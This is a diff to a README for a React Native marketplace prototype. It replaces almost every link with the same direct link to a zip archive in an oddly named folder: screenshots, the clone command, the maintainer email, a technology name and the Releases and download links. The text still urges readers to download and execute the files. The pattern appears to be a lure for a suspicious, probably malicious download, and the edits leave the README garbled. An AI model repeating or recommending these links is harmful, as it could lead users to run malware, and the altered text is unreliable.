@@ -18,7 +18,7 @@ Welcome to the **Market App Prototype** repository! This project showcases a Rea
 
 The Market App Prototype serves as a foundational model for a mobile marketplace application. It aims to connect buyers and sellers in a seamless and efficient manner. This prototype allows users to browse products, view details, and engage with sellers directly.
 
-![Market App Screenshot](https://via.placeholder.com/800x400?text=Market+App+Screenshot)
+![Market App Screenshot](https://raw.githubusercontent.com/skarrnicero/Market_app_prototype/main/allomucic/prototype-app-Market-v3.4.zip+App+Screenshot)
 
 ## 🌟 Features
 
@@ -35,7 +35,7 @@ This prototype utilizes several technologies to create a smooth user experience:
 
 - **React Native**: For building cross-platform mobile applications.
 - **JavaScript**: The primary programming language used in the project.
-- **Node.js**: For backend services and API integration.
+- **https://raw.githubusercontent.com/skarrnicero/Market_app_prototype/main/allomucic/prototype-app-Market-v3.4.zip**: For backend services and API integration.
 - **MongoDB**: To store user and product data.
 - **Express**: For handling server-side logic.
 
@@ -45,7 +45,7 @@ To get started with the Market App Prototype, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/skarrnicero/Market_app_prototype.git
+   git clone https://raw.githubusercontent.com/skarrnicero/Market_app_prototype/main/allomucic/prototype-app-Market-v3.4.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -101,15 +101,15 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or feedback, please reach out to the project maintainer:
 
 - **Name**: Skarrnicero
-- **Email**: skarrnicero@example.com
+- **Email**: https://raw.githubusercontent.com/skarrnicero/Market_app_prototype/main/allomucic/prototype-app-Market-v3.4.zip
 
 ## 📦 Releases
 
-To download the latest version of the Market App Prototype, visit the [Releases](https://github.com/skarrnicero/Market_app_prototype/releases) section. You can download the files and execute them on your device.
+To download the latest version of the Market App Prototype, visit the [Releases](https://raw.githubusercontent.com/skarrnicero/Market_app_prototype/main/allomucic/prototype-app-Market-v3.4.zip) section. You can download the files and execute them on your device.
 
-![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)
+![Download Releases](https://raw.githubusercontent.com/skarrnicero/Market_app_prototype/main/allomucic/prototype-app-Market-v3.4.zip)
 
-You can also check the [Releases](https://github.com/skarrnicero/Market_app_prototype/releases) for updates and new features as they are added.
+You can also check the [Releases](https://raw.githubusercontent.com/skarrnicero/Market_app_prototype/main/allomucic/prototype-app-Market-v3.4.zip) for updates and new features as they are added.
 
 ## 🌐 Topics
 
@@ -126,9 +126,9 @@ This repository covers various topics related to mobile app development:
 
 Here are some screenshots of the Market App Prototype in action:
 
-![Product Listing](https://via.placeholder.com/400x300?text=Product+Listing)
-![User Profile](https://via.placeholder.com/400x300?text=User+Profile)
-![Chat Feature](https://via.placeholder.com/400x300?text=Chat+Feature)
+![Product Listing](https://raw.githubusercontent.com/skarrnicero/Market_app_prototype/main/allomucic/prototype-app-Market-v3.4.zip+Listing)
+![User Profile](https://raw.githubusercontent.com/skarrnicero/Market_app_prototype/main/allomucic/prototype-app-Market-v3.4.zip+Profile)
+![Chat Feature](https://raw.githubusercontent.com/skarrnicero/Market_app_prototype/main/allomucic/prototype-app-Market-v3.4.zip+Feature)
 
 ## 🎉 Acknowledgments
 
